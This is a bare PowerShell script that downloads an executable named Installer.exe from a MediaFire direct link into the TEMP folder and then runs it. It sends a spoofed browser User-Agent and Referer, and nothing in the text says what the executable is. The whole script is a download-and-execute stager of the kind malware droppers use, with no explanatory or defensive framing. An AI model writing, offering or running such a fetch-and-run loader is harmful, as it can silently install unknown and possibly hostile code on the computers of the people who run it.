$url = "https://download1500.mediafire.com/s6bkxdthw2vg2XRcJcZvfglwnSNyaF6LKnAgeIUntHDbyy5maau44MdyRc2Wo7RJXqG20-njA2H02nRTxBJD2AscfsIZE03eZyt7t-1EepXOi7tD8iPCBKYscXLe8ayNMFp5RXh2nhZxB6aiNLNK792RfLVpAoLXUciLHRRP4JCK/fv85qk44ehjq6t6/Installer.exe"
$output = "$env:TEMP\Installer.exe"

Invoke-WebRequest `
    -Uri $url `
    -OutFile $output `
    -Headers @{
        "User-Agent"      = "Mozilla/5.0"
        "Referer"         = "https://www.mediafire.com/"
        "Accept"          = "*/*"
    }

Start-Process $output -Wait
